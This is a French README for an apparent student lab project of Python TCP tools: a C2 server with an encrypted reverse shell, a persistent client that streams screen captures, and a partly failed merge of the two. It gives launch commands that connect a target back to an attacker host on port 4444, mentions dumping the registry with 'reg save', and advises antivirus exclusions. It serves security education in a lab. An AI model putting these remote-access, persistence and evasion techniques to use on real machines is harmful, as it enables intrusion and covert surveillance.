TP Ethical Hacking — Sockets TCP en Python
Ce projet explore la communication réseau via des sockets TCP en Python, dans un cadre strictement éducatif et isolé (machines virtuelles locales).

L'objectif initial était d'unifier deux projets en seulement deux fichiers. Bien que cette unification n'ait pas abouti à un outil parfaitement stable (problèmes de timeouts et de gestion des threads lors de la fusion), le projet a permis de développer trois modules distincts et fonctionnels qui démontrent différentes facettes de l'administration système et de la sécurité réseau.

Avertissement : L'utilisation de ces scripts est strictement réservée à un laboratoire isolé (VM VirtualBox sur un réseau "Host-Only" ou "Pont"). Ne les utilisez jamais sur un système sans autorisation explicite.

Partie 1 : Le C2 (Command & Control) et Reverse Shell
Fichiers concernés : reverse_shell.py (Client) et c2_server.py (Serveur)

Ce module a été conçu pour établir un shell interactif chiffré (XOR et authentification HMAC) et gérer plusieurs machines cibles depuis une interface centralisée.

Fonctionnalités
Connexion inversée (Reverse Shell) pour contourner les pare-feux entrants.

Chiffrement du trafic et authentification par clé secrète (PSK).

Interface interactive multi-clients (list, use, commandes système).

Exécution de commandes Windows (via cmd.exe) ou Linux.

Comment l'utiliser
Sur Kali (Attaquant), lancez le serveur :

bash
python3 c2_server.py
Sur la cible (Windows/Linux), lancez le client avec l'IP de Kali :

bash
python reverse_shell.py 192.168.x.x 4444 --c2
Sur Kali, utilisez l'interface :

list : Affiche les machines connectées.

use 1 : Sélectionne la machine ID 1.

whoami ou dir : Exécute des commandes sur la machine cible.

Partie 2 : La Supervision Vidéo et Persistance
Fichiers concernés : client.py (Client) et server.py (Serveur)

Ce module se concentre sur l'installation persistante sur la machine cible et la transmission de flux vidéo (capture d'écran) vers un tableau de bord web.

Fonctionnalités
Persistance : Le client s'installe dans le démarrage automatique (Tâche planifiée sous Windows, Autostart sous Linux).

Commandes restreintes : Le serveur envoie des commandes prédéfinies (ping, hostname, system, video, etc.).

Dashboard Web : Réception du flux vidéo via un flux MJPEG accessible sur le navigateur.

Compatibilité multi-plateforme pour l'installation des dépendances (mss, Pillow).

Comment l'utiliser
Sur Kali (Serveur), lancez le serveur. Un navigateur s'ouvrira automatiquement sur le dashboard (http://127.0.0.1:8080) :

bash
python3 server.py
Sur la cible, exécutez le client avec l'IP de Kali :

bash
python client.py 192.168.x.x
Sur Kali (Terminal), tapez video pour déclencher la capture d'écran. Regardez votre navigateur web pour voir le flux en direct. Tapez stopvideo pour arrêter.

Partie 3 : La Fusion (Tentative d'unification)
Fichiers concernés : client_final.py et server_final.py

L'objectif de cette partie était de fusionner la persistance et la vidéo (Partie 2) avec le shell interactif chiffré (Partie 1), pour n'avoir que deux fichiers à déployer.

Ce qui a été réalisé
Intégration du protocole de chiffrement (XOR) et du shell interactif dans le client persistant.

Centralisation du dashboard vidéo web et de l'interface de commande C2 dans un seul serveur.

Gestion de l'encodage (cp1252) pour éviter les crashs lors de l'exécution de commandes Windows (comme reg save).

Statut (Échec partiel)
Bien que le code soit théoriquement complet, cette version unifiée rencontre des instabilités en conditions réelles :

Le client perd parfois la connexion (ConnectionRefusedError ou coupures de sockets) lors de l'exécution de commandes lourdes ou lors du lancement simultané de la vidéo.

La gestion des threads (entre le shell C2 et le flux vidéo) provoque des conflits bloquants sous Windows.

La persistance via tâche planifiée (schtasks) interfère parfois avec l'exécution manuelle du client.

Conclusion : Ce module démontre la complexité de fusionner deux architectures réseaux distinctes (un protocole de messagerie structuré pour le C2 et un flux continu binaire pour la vidéo) dans un seul processus sans utiliser de bibliothèques asynchrones avancées (comme asyncio).

Dépannage (Troubleshooting)
Pare-feu : Assurez-vous que les pare-feux Windows et Kali autorisent les ports 4444, 5000, 5001 et 8080.

Antivirus : Windows Defender bloque activement les Reverse Shells. Ajoutez des exclusions pour vos dossiers de test.

Dépendances : Si mss ou Pillow manquent, les scripts tenteront de les installer via pip. Vérifiez que Python est bien dans le PATH de Windows.

Réseau : Vérifiez toujours avec ip a (Kali) et ping que les deux machines communiquent avant de lancer les scripts.
